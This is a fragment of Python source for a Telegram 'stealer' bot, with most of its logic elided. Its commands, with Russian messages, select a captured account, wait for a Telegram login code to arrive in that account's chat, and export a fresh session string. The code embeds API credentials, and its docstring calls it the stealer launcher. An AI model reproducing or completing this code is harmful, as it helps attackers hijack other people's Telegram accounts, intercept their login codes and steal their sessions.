...
bot = Client("stealer_bot", api_id=2040, api_hash="b18441a1ff607e10a989891a5462e627",
...
@bot.on_message(filters.command("select") & filters.private)
...
@bot.on_message(filters.command("getcode") & filters.private)
async def cmd_getcode(c, m):
    ...
    if code:
        ...
        await st.edit_text(f"⏰ Таймаут — код не пришёл.\n\nПричины:\n• SMS (не в чат)\n• Никто не входил\n• Сессия мертва", parse_mode=ParseMode.HTML)
...
async def cmd_session(c, m):
    ...
    if not acc:
        return await m.reply("Не найден.")
    st = await m.reply("⏳ Экспортирую свежую сессию...")
...
def run_stealer_bot():
    """Запуск стилера — вызывается из main.py"""
